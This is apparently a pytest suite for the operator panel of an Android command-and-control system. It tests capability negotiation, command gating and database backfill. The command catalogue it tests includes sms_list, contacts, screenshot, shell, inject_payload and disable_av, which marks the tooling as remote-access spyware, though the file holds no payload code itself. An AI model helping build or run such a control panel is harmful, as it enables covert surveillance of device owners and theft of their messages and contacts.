"""Per-device capability negotiation.

The catalogue and the agent's CommandExecutor are separate files in separate
languages. They drift, and the drift is invisible until an operator clicks a
button and gets ``unsupported command`` back. These tests pin the mechanism
that makes the difference visible.
"""

import json

import pytest

from c2.command_builder import (
    COMMAND_CATALOG,
    UnsupportedOnDevice,
    build_command,
    capabilities_of,
    catalog_for,
    coverage,
    parse_capabilities,
)

CAPS = ["device_info", "screenshot", "shell", "sms_list", "contacts"]


# ------------------------------------------------------------- catalogue

def test_every_entry_has_desc_args_and_group():
    groups = {g for g, _ in
              __import__("c2.command_builder", fromlist=["COMMAND_GROUPS"]).COMMAND_GROUPS}
    for name, meta in COMMAND_CATALOG.items():
        assert "desc" in meta, f"{name} missing desc"
        assert "args" in meta, f"{name} missing args"
        assert isinstance(meta["args"], list), f"{name} args must be a list"
        assert meta["group"] in groups, f"{name} has unknown group {meta['group']}"


def test_arg_specs_are_well_formed():
    for name, meta in COMMAND_CATALOG.items():
        for spec in meta["args"]:
            assert ":" in spec, f"{name}: arg '{spec}' needs a type suffix"
            _, _, kind = spec.partition(":")
            assert kind in ("bool", "int", "str"), \
                f"{name}: arg '{spec}' has unknown type {kind}"


def test_group_order_covers_all_used_groups():
    from c2.command_builder import COMMAND_GROUPS

    declared = {gid for gid, _ in COMMAND_GROUPS}
    used = {meta["group"] for meta in COMMAND_CATALOG.values()}
    assert used <= declared, f"groups not in COMMAND_GROUPS: {used - declared}"


# -------------------------------------------------------------- parsing

@pytest.mark.parametrize("raw,expected", [
    (["a", "b"], {"a", "b"}),
    ("a, b ,c", {"a", "b", "c"}),
    (("a", "b"), {"a", "b"}),
    (None, set()),
    ("", set()),
    ([], set()),
    ("*", set()),
    # "none" is kept, not dropped: it is how an agent says "I implement
    # nothing", and catalog_for() needs to tell that apart from undeclared.
    ("none", {"none"}),
    (12345, set()),
    ({"a": 1}, set()),
])
def test_parse_capabilities(raw, expected):
    assert parse_capabilities(raw) == expected


def test_parse_keeps_unknown_names():
    """A device may implement something this panel has never heard of."""
    assert parse_capabilities(["device_info", "brand_new_thing"]) == \
        {"device_info", "brand_new_thing"}


def test_parse_strips_whitespace_and_ignores_blanks():
    assert parse_capabilities(["  a  ", "", "   ", "b"]) == {"a", "b"}


# ------------------------------------------------------------- filtering

def test_undeclared_device_gets_the_full_catalogue(app, make_device):
    dev_id = make_device("dev-undeclared")
    with app.app_context():
        from models import Device
        dev = db_get(Device, dev_id)
        assert dev.capabilities is None
        assert catalog_for(dev) == COMMAND_CATALOG
        cov = coverage(dev)
        assert cov["declared"] is False
        assert cov["supported"] == cov["total"]


def test_declared_device_is_filtered(app, make_device):
    dev_id = make_device("dev-declared")
    with app.app_context():
        from models import Device
        dev = db_get(Device, dev_id)
        dev.set_capabilities(CAPS)
        commit()

        available = catalog_for(dev)
        assert set(available) == set(CAPS)
        cov = coverage(dev)
        assert cov["declared"] is True
        assert cov["supported"] == len(CAPS)
        assert cov["total"] == len(COMMAND_CATALOG)
        assert set(cov["missing"]) == set(COMMAND_CATALOG) - set(CAPS)


def test_capabilities_round_trip_through_the_column(app, make_device):
    dev_id = make_device("dev-roundtrip")
    with app.app_context():
        from models import Device
        dev = db_get(Device, dev_id)
        dev.set_capabilities(["zebra", "alpha"])
        commit()
        stored = json.loads(dev.capabilities)
        assert stored == ["alpha", "zebra"], "must be sorted for stable display"
        assert capabilities_of(dev) == {"alpha", "zebra"}


def test_declaring_none_leaves_previous_value(app, make_device):
    dev_id = make_device("dev-keep")
    with app.app_context():
        from models import Device
        dev = db_get(Device, dev_id)
        dev.set_capabilities(CAPS)
        commit()
        dev.set_capabilities(None)
        commit()
        assert capabilities_of(dev) == set(CAPS)


def test_none_keyword_means_nothing_supported(app, make_device):
    dev_id = make_device("dev-none")
    with app.app_context():
        from models import Device
        dev = db_get(Device, dev_id)
        dev.set_capabilities(["none"])
        commit()
        assert catalog_for(dev) == {}


# ---------------------------------------------------------------- gating

def test_build_command_rejects_a_command_the_device_declines(app, make_device):
    dev_id = make_device("dev-gate")
    with app.app_context():
        from models import Device
        dev = db_get(Device, dev_id)
        dev.set_capabilities(CAPS)
        commit()

        ok = build_command(dev, "screenshot", {})
        assert ok.command_type == "screenshot"

        with pytest.raises(UnsupportedOnDevice) as exc:
            build_command(dev, "inject_payload", {})
        assert "inject_payload" in str(exc.value)


def test_build_command_allows_anything_for_an_undeclared_device(app, make_device):
    dev_id = make_device("dev-open")
    with app.app_context():
        from models import Device
        dev = db_get(Device, dev_id)
        assert dev.capabilities is None
        for name in COMMAND_CATALOG:
            assert build_command(dev, name, {}).command_type == name


def test_build_command_still_rejects_unknown_types(app, make_device):
    dev_id = make_device("dev-unknown")
    with app.app_context():
        from models import Device
        with pytest.raises(ValueError):
            build_command(db_get(Device, dev_id), "rm_rf", {})


# ------------------------------------------------------------------ http

def _login(client):
    from conftest import OPERATOR_PASSWORD

    from conftest import login

    return login(client)


def test_catalog_without_device_returns_everything(client, make_device):
    make_device("dev-cat")
    payload = _login(client).get("/api/catalog").get_json()
    assert set(payload["commands"]) == set(COMMAND_CATALOG)
    assert payload.get("coverage") is None
    assert any(g["id"] == "recon" for g in payload["groups"])


def test_catalog_for_device_is_narrowed(client, make_device):
    dev_id = make_device("dev-cat2")
    client.post("/api/agent/register", headers={"X-Api-Key": "test-agent-key"},
                json={"device_id": "dev-cat2", "capabilities": CAPS})

    payload = _login(client).get(f"/api/catalog?device_id={dev_id}").get_json()
    assert set(payload["commands"]) == set(CAPS)
    assert payload["coverage"]["declared"] is True
    assert payload["coverage"]["supported"] == len(CAPS)


def test_agent_can_declare_capabilities_on_register(client, make_device):
    make_device("dev-decl")
    r = client.post("/api/agent/register", headers={"X-Api-Key": "test-agent-key"},
                    json={"device_id": "dev-decl",
                          "capabilities": CAPS,
                          "agent_version": "1.0.1"})
    assert r.status_code == 200

    devices = _login(client).get("/api/devices").get_json()
    dev = next(d for d in devices if d["device_id"] == "dev-decl")
    assert sorted(dev["capabilities"]) == sorted(CAPS)
    assert dev["agent_version"] == "1.0.1"
    assert dev["coverage"]["supported"] == len(CAPS)


def test_queueing_an_undeclared_command_returns_409(client, make_device):
    dev_id = make_device("dev-gate-http")
    client.post("/api/agent/register", headers={"X-Api-Key": "test-agent-key"},
                json={"device_id": "dev-gate-http", "capabilities": CAPS})
    op = _login(client)

    ok = op.post(f"/api/device/{dev_id}/command",
                 json={"type": "screenshot", "args": {}})
    assert ok.status_code == 200

    bad = op.post(f"/api/device/{dev_id}/command",
                  json={"type": "inject_payload", "args": {}})
    assert bad.status_code == 409
    body = bad.get_json()
    assert body["error"] == "unsupported_on_device"
    assert body["coverage"]["declared"] is True
    assert "inject_payload" in body["coverage"]["missing"]


def test_undeclared_device_can_still_queue_anything(client, make_device):
    dev_id = make_device("dev-open-http")
    op = _login(client)
    r = op.post(f"/api/device/{dev_id}/command",
                json={"type": "inject_payload", "args": {}})
    assert r.status_code == 200


def test_push_alias_respects_capabilities(client, make_device):
    dev_id = make_device("dev-push")
    client.post("/api/agent/register", headers={"X-Api-Key": "test-agent-key"},
                json={"device_id": "dev-push", "capabilities": CAPS})
    op = _login(client)
    r = op.post(f"/api/device/{dev_id}/push", json={"type": "disable_av"})
    assert r.status_code == 409


def test_catalog_for_unknown_device_is_404(client, make_device):
    make_device("dev-x")
    assert _login(client).get("/api/catalog?device_id=99999").status_code == 404


def test_bad_device_id_falls_back_to_full_catalogue(client, make_device):
    make_device("dev-y")
    payload = _login(client).get("/api/catalog?device_id=abc").get_json()
    assert set(payload["commands"]) == set(COMMAND_CATALOG)


# ------------------------------------------------------- schema backfill

def test_added_columns_are_backfilled_on_an_older_database(tmp_path):
    """A c2.db created before capabilities existed must still boot."""
    import sqlite3

    legacy = tmp_path / "legacy.db"
    con = sqlite3.connect(legacy)
    con.executescript(
        """
        CREATE TABLE devices (
            id INTEGER PRIMARY KEY,
            device_id VARCHAR(64) NOT NULL,
            model VARCHAR(128),
            last_seen DATETIME,
            is_online BOOLEAN
        );
        INSERT INTO devices (device_id, model) VALUES ('old-dev', 'Pixel');
        """
    )
    con.commit()
    con.close()

    from flask import Flask

    from config import Config
    from database import _ensure_columns, db

    app = Flask(__name__)
    app.config.from_object(Config)
    app.config["SQLALCHEMY_DATABASE_URI"] = f"sqlite:///{legacy}"
    db.init_app(app)

    with app.app_context():
        db.create_all()
        added = _ensure_columns(app)
        assert "devices.capabilities" in added
        assert "devices.agent_version" in added

        from sqlalchemy import inspect as sa_inspect
        cols = {c["name"] for c in sa_inspect(db.engine).get_columns("devices")}
        assert {"capabilities", "agent_version"} <= cols

        # Idempotent: a second run adds nothing.
        assert _ensure_columns(app) == []

        # And the existing row survives with nulls.
        from sqlalchemy import text
        row = db.session.execute(
            text("SELECT device_id, capabilities FROM devices WHERE id=1")
        ).fetchone()
        assert row[0] == "old-dev"
        assert row[1] is None


# ---------------------------------------------------------------- helpers

def db_get(model, pk):
    from database import db as _db

    return _db.session.get(model, pk)


def commit():
    from database import db as _db

    _db.session.commit()

# ------------------------------------------- catalogue vs agent arg drift

AGENT_EXECUTOR = (
    __import__("pathlib").Path(__file__).resolve().parent.parent
    / "agent_android/app/src/main/java/com/outcome/c2/CommandExecutor.kt"
)


def _agent_arg_reads():
    """command type -> set of arg names the agent actually reads."""
    import re

    if not AGENT_EXECUTOR.is_file():
        return {}
    src = AGENT_EXECUTOR.read_text()
    out = {}
    for cmd, expr in re.findall(r'"([a-z_]+)"\s*->\s*(.+)', src):
        names = set(re.findall(
            r'args\.(?:get|opt)(?:String|Int|Long|Boolean|Double)\("([^"]+)"',
            expr,
        ))
        if names:
            out[cmd] = names
    return out


def test_every_arg_the_agent_reads_is_in_the_catalogue():
    """A command whose args the panel never asks for throws on the device.

    `upload_file` shipped like this: the catalogue declared only
    `remote_path`, the agent also calls `args.getString("data_b64")`, so the
    command failed 100% of the time no matter what the operator typed.
    """
    reads = _agent_arg_reads()
    if not reads:
        pytest.skip("agent sources not present")

    missing = {}
    for cmd, needed in reads.items():
        if cmd not in COMMAND_CATALOG:
            continue
        declared = {a.partition(":")[0] for a in COMMAND_CATALOG[cmd]["args"]}
        gap = needed - declared
        if gap:
            missing[cmd] = sorted(gap)

    assert not missing, f"agent reads args the catalogue never declares: {missing}"


def test_numeric_args_are_declared_as_int():
    """optLong/optInt on the device side must be fed an int, not a string."""
    import re

    if not AGENT_EXECUTOR.is_file():
        pytest.skip("agent sources not present")
    src = AGENT_EXECUTOR.read_text()

    for cmd, expr in re.findall(r'"([a-z_]+)"\s*->\s*(.+)', src):
        if cmd not in COMMAND_CATALOG:
            continue
        numeric = set(re.findall(
            r'args\.opt(?:Int|Long)\("([^"]+)"', expr))
        if not numeric:
            continue
        declared = {a.partition(":")[0]: a.partition(":")[2]
                     for a in COMMAND_CATALOG[cmd]["args"]}
        for arg in numeric:
            assert declared.get(arg) == "int", (
                f"{cmd}.{arg} is read with optInt/optLong so the catalogue "
                f"must declare it as int, got {declared.get(arg)!r}"
            )


def test_catalog_never_declares_an_unknown_arg_type():
    for cmd, meta in COMMAND_CATALOG.items():
        for spec in meta["args"]:
            name, _, kind = spec.partition(":")
            assert kind in ("bool", "int", "str"), f"{cmd}.{name}: bad type"
